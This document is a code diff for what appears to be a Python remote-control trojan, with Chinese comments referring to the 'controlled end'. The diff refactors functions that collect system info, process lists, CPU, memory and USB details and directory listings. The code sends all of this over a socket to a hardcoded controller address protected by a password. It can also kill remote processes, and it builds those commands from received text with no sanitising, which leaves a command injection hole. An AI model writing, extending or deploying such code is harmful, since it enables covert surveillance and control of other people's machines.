@@ -9,7 +9,7 @@ import subprocess
 
 # 变量定义 ACTIVE 是否主动连接控制端 / TEMP 临时文件路径 / SYS 被控端系统类型 / PATH 被控端文件管理当前路径
 ACTIVE = 1
-IP = '192.168.2.2'
+IP = '127.0.0.1'
 PORT = 9481
 PASS = 'AC131'
 TEMP = None
@@ -65,55 +65,35 @@ def Send(data,sock):
 # 获取系统信息
 def Getinfo(sock):
     if SYS == 'nt':
-        os.system('echo nt@ > C:\\ProgramData\\info.txt')
-        os.system('systeminfo >> C:\\ProgramData\\info.txt')
-        f = open('C:\\ProgramData\\info.txt','r')
-        data = f.read()
-        f.close()
-        Send(data,sock)
-        os.system('del /f /q C:\\ProgramData\\info.txt')
+        res = subprocess.getoutput('systeminfo')
+        res = 'nt@' + res
+        Send(res,sock)
         return
     else:
-        os.system('echo posix@ > %s/info.txt' % TEMP)
-        os.system('uname -a >> %s/info.txt' % TEMP)
-        f = open('%s/info.txt' % TEMP,'r')
-        data = f.read()
-        f.close()
-        Send(data,sock)
-        os.system('rm -f %s/info.txt' % TEMP)
+        res = subprocess.getoutput('uname -a')
+        res = 'posix@' + res
+        Send(res,sock)
         return
 
 # 获取更多信息
 def GetMoreinfo(sock,target):
     if target == 'CPU':
-        os.system('cat /proc/cpuinfo >> %s/info.txt' % TEMP)
+        res = subprocess.getoutput('cat /proc/cpuinfo')
     elif target == 'MEM':
-        os.system('cat /proc/meminfo >> %s/info.txt' % TEMP)
+        res = subprocess.getoutput('cat /proc/meminfo')
     elif target == 'USB':
-        os.system('lsusb -tv >> %s/info.txt' % TEMP)
-    f = open('%s/info.txt' % TEMP,'r')
-    data = f.read()
-    f.close()
-    Send(data,sock)
-    os.system('rm -f %s/info.txt' % TEMP)
+        res = subprocess.getoutput('lsusb -tv')
+    Send(res,sock)
 
 # 进程信息
 def Process(sock):
     if SYS == 'nt':
-        os.system('tasklist >> C:\\ProgramData\\info.txt')
-        f = open('C:\\ProgramData\\info.txt','r')
-        data = f.read()
-        f.close()
-        Send(data,sock)
-        os.system('del /f /q C:\\ProgramData\\info.txt')
+        res = subprocess.getoutput('tasklist')
+        Send(res,sock)
         return
     else:
-        os.system('ps -aux >> %s/info.txt' % TEMP)
-        f = open('%s/info.txt' % TEMP,'r')
-        data = f.read()
-        f.close()
-        Send(data,sock)
-        os.system('rm -f %s/info.txt' % TEMP)
+        res = subprocess.getoutput('ps -aux')
+        Send(res,sock)
         return
 
 # Kill进程 by Name
@@ -121,7 +101,7 @@ def KillName(sock):
     d = sock.recv(1024)
     name = d.decode('utf-8')
     if SYS == 'nt':
-        os.system('taskkill /f /im %s' %name)
+        res = subprocess.getoutput('taskkill /f /im %s' % name)
         sock.send(b'The command has been executed.')
     else:
         sock.send(b'This is Linux OS. Can\'t execute the command.')
@@ -132,9 +112,9 @@ def KillId(sock):
     d = sock.recv(1024)
     id = d.decode('utf-8')
     if SYS == 'nt':
-        os.system('taskkill /f /pid %s' %id)
+        res = subprocess.getoutput('taskkill /f /pid %s' % id)
     else:
-        os.system('kill -9 %s' %id)
+        res = subprocess.getoutput('kill -9 %s' % id)
     sock.send(b'The command has been executed.')
     return
     
@@ -142,22 +122,14 @@ def KillId(sock):
 def File(sock):
     global PATH
     if SYS == 'nt':
-        os.system('echo %s@V@ >> C:\\ProgramData\\info.txt' % PATH)
-        os.system('dir %s >> C:\\ProgramData\\info.txt' % PATH)
-        f = open('C:\\ProgramData\\info.txt','r')
-        data = f.read()
-        f.close()
-        Send(data,sock)
-        os.system('del /f /q C:\\ProgramData\\info.txt')
+        res = subprocess.getoutput('dir %s' % PATH)
+        res = '%s' % PATH + '@V@' + res
+        Send(res,sock)
         return
     else:
-        os.system('echo %s@V@ >> %s/info.txt' % (PATH, TEMP))
-        os.system('ls -l %s >> %s/info.txt' % (PATH, TEMP))
-        f = open('%s/info.txt' % TEMP,'r')
-        data = f.read()
-        f.close()
-        Send(data,sock)
-        os.system('rm -f %s/info.txt' % TEMP)
+        res = subprocess.getoutput('ls -l %s' % PATH)
+        res = '%s' % PATH + '@V@' + res
+        Send(res,sock)
         return
 
 # 父目录
